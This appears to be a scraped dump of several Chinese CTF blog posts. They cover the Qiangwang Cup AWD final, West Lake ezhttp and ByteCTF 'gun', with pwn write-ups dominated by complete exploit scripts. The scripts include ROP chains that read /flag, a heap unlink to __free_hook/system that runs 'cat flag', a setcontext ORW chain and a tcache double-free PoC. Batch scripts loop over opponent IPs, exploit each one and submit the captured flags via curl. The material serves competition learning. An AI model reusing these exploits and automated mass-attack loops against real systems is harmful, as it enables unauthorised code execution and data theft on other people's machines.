payload+=p64(p_rdi)+p64(3)+p64(p_rsi)+p64(stack+0x300)+p64(p_rdx)+p64(0x30)+p64(p_rax)+p64(0)+p64(syscall_ret) payload+=p64(p_rdi)+p64(1)+p64(p_rsi)+p64(stack+0x300)+p64(p_rdx)+p64(0x30)+p64(p_rax)+p64(1)+p64(syscall_ret) # pause() # gdb.attach(p) p.sendline('A'*(0x4b)+'/flag\\x00\\x00\\x00'+payload) p.interactive()if __name__ == '__main__': pwn()","link":"/2020/09/22/%E7%BE%8A%E5%9F%8E%E6%9D%AF_Quals_repwn/"},{"title":"强网杯_final","text":"强网杯_final 没想到第一次打线下就回到了家乡河南，强网有排面！！ 线下赛赛制为AD(awd)和RW(real world)，real world就相当与挖掘0day，难度不言而喻，AD的话只有pwn题，占50%的分数，因此pwn采用的是只打ad的策略，最后也取得了不错的效果。 AD的赛前准备打AD要想获得不错的成绩，我认为最重要的就是要抢占先机。率先发现漏洞，并写出exp，往往能打得别人措手不及，因此赛前的脚本准备往往非常重要。 准备脚本一般分为两类：1.批量IP生成脚本。2.批量交flag的脚本。批量IP生成脚本： 12345678910111213141516171819import sysf = open(&quot;ip.txt&quot;,&quot;wb&quot;)try: ip = sys.argv[1] range_ = int(sys.argv[2]) for i in range(1,range_): t = ip.replace(&quot;x&quot;,str(i)) f.write(t+'\\n')except: print &quot;usage: python %s ip range&quot; % sys.argv[0] f.close()f.close()usage:python ip.py 172.168 .1 .1 :x 20 批量交flag脚本： 1234567891011121314151617181920212223if __name__ == &quot;__main__&quot;: # libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) # elf = ELF(&quot;./pwn&quot;,checksec=False) ips = [i.strip() for i in open(&quot;ip.txt&quot;,&quot;rb&quot;).readlines()] while 1: for ip in ips: try: sleep(0.3) flag = main(ip) # flag = main(args[&quot;REMOTE&quot;]) info(flag) url = 'https://172.20.1.1/Answerapi/sub_answer_api' token = 'token9013e05455d' cmds = 'curl -k {} -d &quot;answer={}&amp;playertoken={}&quot;'.format(url,flag.strip(),token) print cmds if 'flag' in cmds: os.system(cmds) except Exception,err: # p.close() print err continue适用于有curl接口的AD，若没此接口，则先抓包，写出sub_flag函数批量提交。 AD全程高能Pwn题一共出了4道。 win(一道windows下的栈溢出) pd0(go写的一个框架) sort(vm_pwn) thrd(线程堆题) 个人认为最难的是pd0，好像只有0x300R第二天做出来了，疯狂打群场。不过我们守住了，ruan师傅在github上找到了源码，打patch改了max_size，nb! 下面依次分析： 0x01 winwin是第一个放出的题目，仅过4分钟vidar-time就发起进攻，我们也瞬间反应过来这道题目有后门果然： 12345678910111213141516171819if ( !memcmp(v43, &quot;vvqqccqaFEFH&quot;, v45) &amp;&amp; v44 == 12 ) 我patch过了已经 { v46 = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if ( !v46 ) { v47 = sub_1400060E0(std::cout, (__int64)&quot;Can't open the flag file&quot;); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v47, sub_1400062B0); exit(1); } while ( !feof(v46) ) { if ( fgets(&amp;Buf, 128, v46) ) { v48 = sub_1400060E0(std::cout, (__int64)&amp;Buf); //cout&lt;&lt;flag！！ std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v48, sub_1400062B0); } } fclose(v46); } 第一波脚本： 12345678910111213141516171819202122def main(host,port=16957): global p if host: p = remote(host,port,timeout=1) else: p = process(&quot;./pwn_bak.bak.bak&quot;) # debug(0x000000000000107B) p.recvuntil(&quot;[*] Rounds 1 $&quot;) p.sendline(&quot;Banner hide&quot;) p.sendline(&quot;wwssadadBABA&quot;) p.recvuntil(&quot;wwssadadBABA ]\\r\\n&quot;) try: # p.sendline(&quot;cat flag&quot;) # p.recv(timeout=0.5) flag = p.recvuntil(&quot;\\r\\n&quot;,drop=True,timeout=0.5) info(flag) p.close() return flag except Exception,err: print err p.close() return &quot;bad_luck&quot; 直接打到第六，但其他队也不是吃素的，patch改”wwssadadBABA”为其他字符串。 之后又有一个洞在这里： 12345678910111213141516171819202122sub_1400060E0(v5, (__int64)&quot;Please input the password: &quot;); sub_140007060(std::cin, &amp;password); v6 = &amp;password; v7 = (char *)password; v8 = v31; if ( v31 &gt;= 16 ) v6 = password; memcpy(&amp;Dst, v6, Size); size为实际的password长度 if ( strncmp(&amp;Dst, &quot;I_Love_QWB&quot;, 0xAui64) ) { v9 = sub_1400060E0(std::cout, (__int64)&quot;Your password &quot;); v10 = sub_1400060E0(v9, (__int64)&amp;Dst); v11 = sub_1400060E0(v10, (__int64)&quot; seems not true!&quot;); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v11, sub_1400062B0); sub_1400060E0(std::cout, (__int64)&quot;Try again: &quot;); sub_140007060(std::cin, &amp;password); v12 = &amp;password; v7 = (char *)password; v8 = v31; if ( v31 &gt;= 0x10 ) v12 = password; memcpy(&amp;Dst, v12, Size); 可见，第一次输入较长的password可以泄露出stack上的地址，然后再借助第二次的try again覆盖返回地址为上面后门函数的地址即可! patch限制size为0x30，栈溢出不了。 0x02 pd0源码地址：https://github.com/HITB-CyberWeek/proctf-2019/blob/master/services/handy/server/main.go Fixing：Either the padding should be removed or a handler should be modified to not leak the information, e.g. by changing the max allowed size of the generated picture. 0x03 sort感觉是最有意思的一题。题目意思是要完成对一个随机数组进行排序，所执行的汇编指令越少分数越高，分高的一方获胜，攻击方获胜拿flag，防守方获胜则攻击方无法拿flag.同时有给出了出题人自己写的汇编指令系统，还要opcode和初赛的qwlogin一样，省去了逆opcode的时间。 opcode: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;//INST#define HLT 0x00#define MOV 0x01//CALC#define ADD 0x02#define SUB 0x03#define MUL 0X04#define DIV 0x05#define MOD 0X06//BIT#define XOR 0x07#define OR 0x08#define AND 0x09#define SHL 0x0a#define SHR 0x0b#define NOT 0x0c//STACK#define POP 0x0d#define PUSH 0x0e//FUNC#define CALL 0x10#define RET 0x11//JMP#define CMP 0x12#define JMP 0x13#define JE 0x14#define JNE 0x15#define JG 0x16#define JNG 0x17#define JL 0x18#define JNL 0x19#define JA 0x1a#define JNA 0x1b#define JB 0x1c#define JNB 0x1d//INT#define SYSCALL 0x20//ADDR#define RR 0X00#define RL 0x01#define LR 0x02#define RS 0x03#define SR 0x04#define RI 0x05#define R_ 0X06#define I_ 0x07#define L_ 0x08#define S_ 0x09#define __ 0x0a#define PR 0x0b //RegLoad Reg#define RP 0x0c //Reg RegLoad#define QR 0x0d //RegStack Reg#define RQ 0x0e //Reg RegStack//WIDTH#define BYTE 0x10#define WORD 0x20#define DWORD 0x30#define QWORD 0x40#define WIDTH(X) (X &amp; 0xf0)#define ADDR(X) (X &amp; 0x0f)#define S_O(X) (X |= 0b0000000000000001)#define S_S(X) (X |= 0b0000000000000010)#define S_Z(X) (X |= 0b0000000000000100)#define S_C(X) (X |= 0b0000000000001000)#define C_O(X) (X &amp;= ~(0b0000000000000001))#define C_S(X) (X &amp;= ~(0b0000000000000010))#define C_Z(X) (X &amp;= ~(0b0000000000000100))#define C_C(X) (X &amp;= ~(0b0000000000001000))#define R_O(X) (X &amp; 0b0000000000000001)#define R_S(X) ((X &amp; 0b0000000000000010) &gt;&gt; 1)#define R_Z(X) ((X &amp; 0b0000000000000100) &gt;&gt; 2)#define R_C(X) ((X &amp; 0b0000000000001000) &gt;&gt; 3)enum SYSCALLS { _SYS_OPEN = 0, _SYS_READ = 1, _SYS_WRITE, _SYS_CLOSE}; 接下来就得手撕汇编了，我们选择了较为简单的冒泡排序，又因为没有那种直接操作内存的指令，就只能用寄存器传递，导致效率并不是很高。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *context.arch = 'amd64'def main(host,port=14640): global p if host: p = remote(host,port) else: # pass p = process(&quot;./BATTLE&quot;,aslr=False) # gdb.attach(p,&quot;b *0x555555554000+0x00000000000EEb9 if $rdx == 0x1e&quot;) # gdb.attach(p,&quot;b *0x555555554000+0x00000000000F238&quot;) p.recvuntil(&quot;Beat Me!&quot;) code = '' # loop1: code += p8(0x12) + p8(0x15) + p8(3) + p8(99) # cmp r3,99 code += p8(0x16) + p8(0x17) + p8(0x65) # JG exit code += p8(0x1) + p8(0x40) + p8(6) + p8(3) # mov r6,r3 code += p8(0x1) + p8(0x15) + p8(0) + p8(99) # mov r0,99 code += p8(0x3) + p8(0x40) + p8(0) + p8(6) # sub r0,r6 code += p8(0x1) + p8(0x45) + p8(4) + p64(0) # mov r4,0 # loop2: code += p8(0x12) + p8(0x40) + p8(4) + p8(0) # cmp r4,r0 code += p8(0x14) + p8(0x17) + p8(0x38) # je update code += p8(0x1) + p8(0x40) + p8(5) + p8(4) # mov r5,r4 code += p8(0x4) + p8(0x25) + p8(5) + p16(8) # mul r5,8 code += p8(0x1) + p8(0x4c) + p8(1) + p8(5) # mov r1,mem[r5] code += p8(0x1) + p8(0x40) + p8(6) + p8(5) # mov r6,r5 code += p8(0x2) + p8(0x25) + p8(6) + p16(8) # add r6,8 code += p8(0x1) + p8(0x4c) + p8(2) + p8(6) # mov r2,mem[r6] code += p8(0x12) + p8(0x40) + p8(1) + p8(2) # cmp r1,r2 code += p8(0x1c) + p8(0x17) + p8(8) # jb next code += p8(0x1) + p8(0x4b) + p8(6) + p8(1) # mov mem[r6],r1 code += p8(0x1) + p8(0x4b) + p8(5) + p8(2) # mov mem[r5],r2 # next: code += p8(0x2) + p8(0x25) + p8(4) + p16(1) # add r4,1 code += p8(0x13) + p8(0x47) + p64(-0x3f+0x10000000000000000)# jmp loop2 # update: code += p8(0x2) + p8(0x25) + p8(3) + p16(1) # add r3,1 code += p8(0x13) + p8(0x47) + p64(-0x6c+0x10000000000000000)# jmp loop1 # exit: code += p8(0x20) + &quot;AAAAAAAAA&quot; p.send(code) p.recvuntil(&quot;WINNER!\\n&quot;) try: # p.recvuntil(&quot;ftp&gt;&quot;) # p.sendline(&quot;type flag.txt&quot;) # p.recv(timeout=0.5) flag = p.recvuntil(&quot;\\n&quot;,drop=True,timeout=0.5) info(flag) p.close() return flag except Exception,err: print err p.close() return &quot;bad_luck&quot; # p.interactive()if __name__ == &quot;__main__&quot;: # libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) # elf = ELF(&quot;./pwn&quot;,checksec=False) ips = [i.strip() for i in open(&quot;ip.txt&quot;,&quot;rb&quot;).readlines()] while 1: for ip in ips: try: sleep(0.3) flag = main(ip) # flag = main(args[&quot;REMOTE&quot;]) info(flag) url = 'https://172.20.1.1/Answerapi/sub_answer_api' token = 'token7024a591c07' cmds = 'curl -k {} -d &quot;answer={}&amp;playertoken={}&quot;'.format(url,flag.strip(),token) print cmds if 'flag' in cmds: os.system(cmds) # pause() except Exception,err: p.close() print err continue VM_pwn一定要耐心！！！一边写，一边调。 0x04 thrd最后一题终于是heap题了，但牵扯到线程的条件竞争问题，使得调试起来会很奇怪。 漏洞存在于edit函数中： 123456789101112131415161718192021int __fastcall edit(unsigned int a1, unsigned int a2, int a3){ unsigned __int64 v3; // rax int v4; // er12 if ( a1 &lt;= 0xF ) { if ( heaplist[a1] ) { v3 = sizelist[a1] - 4LL; 当size为0时，v3=-4(unsigned int)，造成堆溢出 if ( a2 &lt;= v3 ) { v4 = a3; pthread_mutex_lock(&amp;mutex); *(_DWORD *)(heaplist[a1] + a2) = v4; LODWORD(v3) = pthread_mutex_unlock(&amp;mutex); } } } return v3;} 还有一个洞是在enc中： 1234567891011121314151617181920212223242526272829303132333435363738394041424344void __fastcall enc(unsigned int a1, int a2){ __int64 idx; // rbx const char *v3; // rdi unsigned int content_len; // er12 unsigned int v5; // eax _DWORD *v6; // rdx __int64 v7; // rax if ( a1 &lt;= 0xF ) { idx = a1; v3 = (const char *)heaplist[a1]; if ( v3 ) { content_len = strlen(v3); pthread_mutex_lock(&amp;mutex); v5 = content_len &gt;&gt; 2; if ( (content_len &gt;&gt; 2) &amp; 3 ) { ++v5; v6 = (_DWORD *)heaplist[idx]; } else { v6 = (_DWORD *)heaplist[idx]; if ( !v5 ) {LABEL_7: pthread_mutex_unlock(&amp;mutex); return; } } v7 = (__int64)&amp;v6[v5]; do { *v6 ^= a2; ++v6; } while ( v6 != (_DWORD *)v7 ); goto LABEL_7; } }} 这个的逻辑主要是进行了异或的操作，但漏洞是strlen()函数，当填满堆后strlen会拿到下一个heap的size为，从而我们可以修改下一个heap的size。 程序一开始给出了elf基地址，PIE白开了，还能控制next heap’s size，因此可以unlink，但中间show泄露的时候，由于线程竞争问题，需要对heap进行修复，当时是抄流量才知道的，很迷。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105from pwn import *context.arch = 'amd64'def add(idx,sz): return p32(1) + p32(idx) + p32(sz)def show(idx): return p32(3) + p32(idx)def dele(idx): return p32(4) + p32(idx)def xor_(idx,value): return p32(6) + p32(idx) + p32(value)def edit(idx,offset,value): return p32(2) + p32(idx)+p32(offset) + p32(value)def main(host,port=17066): global p if host: p = remote(host,port,timeout=1) else: p = process(&quot;./pwn_bak.bak.bak&quot;) # debug(0x000000000000107B) libc.address = 0 p.recvuntil(&quot;mem: &quot;) elf_addr = int(p.recvuntil('\\n',drop=True),16) - 0x2021a0 backdoor = elf_addr+0x000000000000DB0 info(&quot;elf : &quot; + hex(elf_addr)) ptr = elf_addr + 0x000000000202120 action = '' action += add(0,0x28) + add(1,0xf0) + add(2,0xf0) + add(3,0xf0) + add(4,0xf0) + add(5,0xf0) for i in range(0,0x28,4): action += edit(0,i,u32(&quot;efbead6e&quot;.decode('hex'))) action += xor_(0,0x401) data = p32(0)*2+p64(0x21) data += p32(0xffffffff&amp;(ptr-0x18)) + p32((ptr-0x18)&gt;&gt;32) data += p32(0xffffffff&amp;(ptr-0x10)) + p32((ptr-0x10)&gt;&gt;32) data += p32(0x20) + p32(0) for i in range(0,0x28,4): action += edit(0,i,u32(data[i:i+4])) action += dele(1) + add(6,0xf0) action += edit(6,0x10,0x30) + edit(6,0x18,0x11) action += edit(0,0x18,0xffffffff&amp;ptr) + edit(0,0x1c,ptr&gt;&gt;32) action += edit(0,0x8,0xffffffff&amp;(elf_addr+0x201F50)) + edit(0,0xc,(elf_addr+0x201F50)&gt;&gt;32) action += show(1) p.sendline(action) p.recvuntil(&quot;content: &quot;) libc.address = u64(p.recv(6).ljust(8,&quot;\\x00&quot;)) - libc.symbols[&quot;free&quot;] info(&quot;libc : &quot; + hex(libc.address)) sleep(1) action = '' action += edit(0,0x10,0xffffffff&amp;(libc.symbols[&quot;__free_hook&quot;]-8)) + edit(0,0x14,(libc.symbols[&quot;__free_hook&quot;]-8)&gt;&gt;32) action += edit(2,0,u32(&quot;/bin&quot;)) + edit(2,0x4,u32(&quot;/sh\\x00&quot;)) action += edit(2,8,0xffffffff&amp;(libc.symbols[&quot;system&quot;])) + edit(2,0xc,(libc.symbols[&quot;system&quot;])&gt;&gt;32) action += dele(2) p.sendline(action) sleep(0.3) p.sendline(&quot;;echo hack_by_qwruan &amp;&amp; cat flag&quot;) p.recvuntil(&quot;qwruan\\n&quot;) try: p.recvuntil(&quot;flag&quot;,timeout=0.5) flag = &quot;flag&quot; + p.recvuntil(&quot;\\n&quot;,timeout=0.5) info(flag) p.close() return flag except Exception,err: print err p.close() return &quot;bad_luck&quot; # p.interactive()if __name__ == &quot;__main__&quot;: # libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) # elf = ELF(&quot;./pwn&quot;,checksec=False) ips = [i.strip() for i in open(&quot;ip.txt&quot;,&quot;rb&quot;).readlines()] libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) while 1: for ip in ips: try: sleep(1) flag = main(ip) # flag = main(args[&quot;REMOTE&quot;]) info(flag) url = 'https://172.20.1.1/Answerapi/sub_answer_api' token = 'token9013e05455d' cmds = 'curl -k {} -d &quot;answer={}&amp;playertoken={}&quot;'.format(url,flag.strip(),token) print cmds if 'flag' in cmds: os.system(cmds) except Exception,err: p.close() print err continue ruan师傅nb，我还是太年轻了。还有很长的路要走:D","link":"/2020/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF_final%E6%88%98%E8%AE%B0/"},{"title":"西湖论剑","text":"西湖论剑 ezhttp 花了一下午做这题，被没有符号表的libc折磨的死去活来，不知道为啥我电脑ubuntu18的libcTM升级到1.3的没法tcache double free了，赛后自己编译了一个带dbg符号的，再ld_preload就可以了。 这题是道套了层类似http收发形式的堆体，逆这个收发花费了大部分的时间，这个就没什么好说的了，只要写下后面的利用手段吧： add函数： 12345678910v2 = strlen(&amp;src); heaplist[2 * i] = malloc(v2); if ( !heaplist[2 * i] ) { quit((__int64)&quot;HTTP/1.1 500 INTERNAL SERVER ERROR&quot;, (__int64)&quot;Something error!&quot;); exit(0); } heaplist[2 * i + 1] = (void *)strlen(&amp;src); v3 = strlen(&amp;src); strncpy((char *)heaplist[2 * i], &amp;src, v3); 看到它是用strlen获取content的长度，之后malloc再strncpy，strlen会被’\\x00’截断，在后面构造时给我带来了不少的麻烦。 dele函数有uaf: 123free(heaplist[2 * idx]);heaplist[2 * idx + 1] = 0LL; // UAFquit((__int64)&quot;HTTP/1.1 200 OK&quot;, (__int64)&quot;Delete success!&quot;); edit还是正常的，哦对结尾加个’\\n’： 12345678for ( i = 0; src[i] != '\\n'; ++i ) ;if ( v4 &lt; 0 || v4 &gt; 15 || !heaplist[2 * v4] || i &gt; (__int64)heaplist[2 * v4 + 1] ){ quit((__int64)&quot;HTTP/1.1 404 Not Found&quot;, (__int64)&quot;No!You can't&quot;); exit(0);}memcpy(heaplist[2 * v4], src, i); 由于没有show，add函数给了我们堆地址因此自然想到double free打tcache的结构体，之后dele0x100的堆进入unsortedbin写入main_arena地址，double free同时改main_arena后2字节来打stdout，但由于add时的’\\x00’限制，要改写地址为stdout上面的地址，并填充’a’但0xfbad18不能改，其他都填’a’，开始以为不行，但仍能成功泄露，有点nb，之后由于有seccomp所以改free_hook为setcontext+53，并在0x100的堆里写payload，之后dele。利用setcontext+53来构造寄存器(rdi=0,rsi=heap+0xa0,rdx=0x200)，rsp改到heap+0xa8，之后返回时去执行read读入后续的shellcode到栈里面rsp位置然后ret到shellcode来orw。 12345678910111213141516171819pwndbg&gt; telescope 0x555556d1f32000:0000│ 0x555556d1f320 ◂— 0x67616c662f2e /* './flag' */01:0008│ 0x555556d1f328 ◂— 0x0... ↓pwndbg&gt; telescope 0x555556d1f320 10000:0000│ 0x555556d1f320 ◂— 0x67616c662f2e /* './flag' */01:0008│ 0x555556d1f328 ◂— 0x0... ↓0e:0070│ 0x555556d1f390 —▸ 0x555556d1f3c0 —▸ 0x7fb514444a78 (mblen+104) ◂— pop rax0f:0078│ 0x555556d1f398 —▸ 0x555556d21000 ◂— 0x010:0080│ 0x555556d1f3a0 ◂— 0x200... ↓12:0090│ 0x555556d1f3b0 ◂— 0x0... ↓14:00a0│ rsi 0x555556d1f3c0 —▸ 0x7fb514444a78 (mblen+104) ◂— pop rax... ↓17:00b8│ 0x555556d1f3d8 ◂— 0x018:00c0│ 0x555556d1f3e0 —▸ 0x7fb5144d39d5 (__time_syscall+5) ◂— syscall19:00c8│ rsp 0x555556d1f3e8 ◂— 0x6161616161616161 ('aaaaaaaa') exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130from pwn import *context.log_level='debug'context.arch='amd64'def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def add(content): p.recvuntil(&quot;======= Send Http packet to me: ========\\n&quot;) p.send(('POST /create Cookie: user[^=admin token: \\r\\r\\n\\r\\ncontent={} ').format(content))def dele(idx): p.recvuntil(&quot;======= Send Http packet to me: ========\\n&quot;) p.send(('POST /del Cookie: user[^=admin token: \\r\\r\\n\\r\\nindex={} ').format(idx))def edit(idx,content): # sleep(0.5) p.recvuntil(&quot;======= Send Http packet to me: ========\\n&quot;) p.send(('POST /edit Cookie: user[^=admin token: \\r\\r\\n\\r\\nindex={0}&amp;content={1}&amp;').format(idx,content))def add2(content): p.recvuntil(&quot;======= Send Http packet to me: ========&quot;) p.send(('POST /create Cookie: user[^=admin token: \\r\\r\\n\\r\\ncontent={} ').format(content))def dele2(idx): p.recvuntil(&quot;======= Send Http packet to me: ========&quot;) p.send(('POST /del Cookie: user[^=admin token: \\r\\r\\n\\r\\nindex={} ').format(idx))def edit2(idx,content): # sleep(0.5) p.recvuntil(&quot;======= Send Http packet to me: ========&quot;) p.send(('POST /edit Cookie: user[^=admin token: \\r\\r\\n\\r\\nindex={0}&amp;content={1}&amp;').format(idx,content))def main(host,port=55504): global p if host: p=remote(host,port) else: p=process([&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&quot;,&quot;./ezhttp&quot;],env={&quot;LD_PRELOAD&quot;:&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;}) # p=process(&quot;./ezhttp&quot;) add('a'*0x40) p.recvuntil(&quot;Your gift: &quot;) heap=int(p.recv(14),16) success(&quot;heap: &quot;+hex(heap)) add('b'*0x40) # dele(1) dele(0) dele(0) # debug(0x0000000000019E3) add('a'*0x40) dele(0) edit(2,p64(heap-0x250)[:6]+'\\n') add('a'*0x40) add('\\xff'*0x40) add('a'*0x10) add('a'*0x100) add('a'*0x30) dele(6) add('a'*0x100) dele(6) edit(4,p8(0x1)*0x40+'\\n') dele(0) dele(0) edit(2,p64(heap+0xa0+0x20)[:6]+'\\n') gdb.attach(p) stdout=int(raw_input('input: '),16) edit(8,p16(stdout)+'\\n') add('a'*0x40) add('a'*0x40) # add('a'*0x40) # debug(0x0001A78) add('a'*0x1f+p32(0xfbad1801)+'a'*4 + 'a'*0x18 +'a') # p.recvuntil('a'*0x1f) libc.address=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,'\\x00'))-0x3ec761 success(&quot;libc: &quot;+hex(libc.address)) edit2(11,p64(0xfbad1800) + p64(0) * 3 +p8(0xc8)+'\\n') dele2(0) edit2(2,p64(libc.sym['__free_hook']-0x38)+'\\n') add2('a'*0x40) add2('a'*0x38+p64(libc.address+0x52145)[:6]) edit2(1,'/bin/sh\\x00\\n') heap -= 0x260 p_rdi = 0x2155f+libc.address p_rdx_rsi = 0x130889+libc.address p_rax = 0x43a78+libc.address syscall_ret = 0xd29d5+libc.address payload = '' payload += './flag'+'\\x00'*2 payload += p64(0)*12 #offset 0x68 payload += p64(0) #rdi payload += p64(heap+0x320+0xa0) #rsi payload += p64(heap+0x2000) #rbp payload += p64(0x200)*2 #rbx and rdx payload += p64(0)*2 payload += p64(heap+0x320+0xa8) # rsp payload += p64(p_rax) #rcx payload += p64(p_rax) payload += p64(0)+p64(syscall_ret) edit2(8,payload+'\\n') #gdb.attach(p) dele2(6) #pause() rop_chain = [ p_rdi,heap+0x320,p_rdx_rsi,0,0,p_rax,2,syscall_ret, p_rdi,4,p_rdx_rsi,0x100,heap+0x2000,p_rax,0,syscall_ret, p_rdi,1,p_rax,1,syscall_ret ] gdb.attach(p) p.send(&quot;A&quot;*0x28+flat(rop_chain)) p.interactive()if __name__ == '__main__': libc=ELF(&quot;./libc-2.27.so&quot;) # libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) main(0) libc使用的时glibc all in one里面的，download时候也一起把dbg符号一起下载了，之后编译一下就能用了。","link":"/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91_Quals_ezhttp/"},{"title":"ByteCTF初赛","text":"ByteCTF2020 部分pwn&amp;re 比赛打了两天，挺激烈的，尤其最后时刻大家都疯狂冲分，最后没能守住掉到23了🤦 这场比赛给我的最深的感受是我的逆向经验太少了，导致花费了很多时间在没用的函数里，值得好好总结。 gun第一道pwn题，多亏ruan师傅眼疾手快帮我改好了最后的rop，拿到了二血，不然我还得调半天，这种最后的orw可以当作模板来用，好好体会一下。 题目是道菜单题，2.31的libc，功能大概是buy(购买子弹)–add 123456789101112131415161718192021222324__int64 buy(){ __int64 idx; // [rsp-18h] [rbp-18h] unsigned __int64 v2; // [rsp-10h] [rbp-10h] __asm { endbr64 } idx = sub_1542(); if ( idx &lt; 0 ) return puts_1(&quot;Enough&quot;); if ( qword_4070[3 * idx] == 1LL ) return puts_1(&quot;The bullet is Used!&quot;); puts_0(&quot;Bullet price: &quot;); v2 = sub_14E3(); if ( v2 &lt;= 0xF || (__int64)((__int64)off_4010 - v2) &lt; 0 ) return puts_1(&quot;Too pool!&quot;); if ( v2 &gt; 0x500 ) return puts_1(&quot;Too big!&quot;); *((_QWORD *)&amp;unk_4060 + 3 * idx) = sub_11A0(v2); qword_4070[3 * idx] = 1LL; puts_0(&quot;Bullet Name: &quot;); read_n(*((_QWORD *)&amp;unk_4060 + 3 * idx), v2); off_4010 = (__int64 (__fastcall *)())((char *)off_4010 - v2); return puts_1(&quot;Confirm&quot;);} load(填充子弹，即将heap链接一起) 123456789101112131415__int64 sub_16E1(){ unsigned __int64 v1; // [rsp-10h] [rbp-10h] __asm { endbr64 } puts_0(&quot;Which one do you want to load?&quot;); v1 = sub_14E3(); if ( v1 &gt; 0xD || qword_4070[3 * v1] == 0LL || qword_4070[3 * v1] == 2LL ) return puts_1(&quot;what??&quot;); if ( qword_4050 ) *((_QWORD *)&amp;unk_4068 + 3 * v1) = qword_4050; qword_4050 = (__int64)&amp;unk_4060 + 24 * v1; *((_QWORD *)&amp;unk_4060 + 3 * v1 + 2) = 2LL; return puts_1(&quot;Confirm.&quot;);} shoot(发射子弹)–dele。 123456789101112131415161718192021222324__int64 sub_15F8(){ __int64 v1; // rsi int i; // [rsp-18h] [rbp-18h] __int64 v3; // [rsp-14h] [rbp-14h] __int64 v4; // [rsp-10h] [rbp-10h] __asm { endbr64 } if ( !qword_4050 ) return puts_1(&quot;No bullet!&quot;); puts_0(&quot;Shoot time: &quot;); v3 = (unsigned int)sub_14E3(); for ( i = 0; qword_4050 &amp;&amp; i &lt; (int)v3; ++i ) { v1 = *(_QWORD *)qword_4050; puts_0(&quot;Pwn! The %s bullet fired.\\n&quot;); sub_1100(*(_QWORD *)qword_4050, v1); v4 = qword_4050; qword_4050 = *(_QWORD *)(qword_4050 + 8); *(_QWORD *)(v4 + 16) = 0LL; } sub_159A(); return puts_0(&quot;%lld bullets left\\n&quot;);} 分析heap的结构体为： 12345struct container{ void *heap_ptr void *next_heap int status //1为可用，2为以装载，3为free掉了} 漏洞点在于load后使用next_heap指针将load的堆块连接起来，但shoot之后next_heap并不会清除，而且heap_ptr也未置0，只是将其free并修改status改为0，但之后我们可以只add回来一个但shoot两个，shoot第二个时会通过next_heap找到那个已经free的堆，由于没有对status的检查导致可以二次dele，但由于2.31加入了tecache的key机制导致tecache_attack无法使用。 构造二次dele的poc: 12345678910add(0x60,'a'*8)add(0x500,'b'*8)add(0x60,'c'*8)load(1)load(0)shoot(1)add(0x60,'d'*8)shoot(1)load(0)shoot(2) #dele第二2个时导致double free tecache的double free无法使用了，但是fastbin的可以鸭，先填满tecache，再用上面的方法在fastbin构造double free，之后在add时会先取出tecache里的bin，当tecache取完之后会从fastbin取，当第一次从fastbin取时，会把剩下的fastbin放回tecache，因此我们就能利用tecache attack打到free_hook。 1234567891011121314pwndbg&gt; binstcachebins0x70 [ 7]: 0x560f03853850 —▸ 0x560f038533b0 —▸ 0x560f03853420 —▸ 0x560f03853490 —▸ 0x560f03853500 —▸ 0x560f03853570 —▸ 0x560f038535e0 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x560f03853330 —▸ 0x560f038532c0 ◂— 0x560f03853330 先在fastbin double free0x80: 0x0unsortedbinall: 0x560f038536b0 —▸ 0x7f6f3fdadbe0 (main_arena+96) ◂— 0x560f038536b0smallbins 之后取完tecache 1234567891011121314pwndbg&gt; binstcachebinsemptyfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x561bb646c330 —▸ 0x561bb646c2c0 ◂— 0x561bb646c3300x80: 0x0unsortedbinall: 0x561bb646c6b0 —▸ 0x7fc69a821be0 (main_arena+96) ◂— 0x561bb646c6b0smallbins 第一次取fastbin时（也即改fd）： 1234567891011121314pwndbg&gt; binstcachebins0x70 [ 3]: 0x556f27c2a2d0 —▸ 0x556f27c2a340 —▸ 0x7fe4fb1f0b28 (__free_hook) ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x556f27c2a6b0 —▸ 0x7fe4fb1edbe0 (main_arena+96) ◂— 0x556f27c2a6b0smallbins 可以看到放回tecache了，由于没size检查，可以打free_hook。 exp: 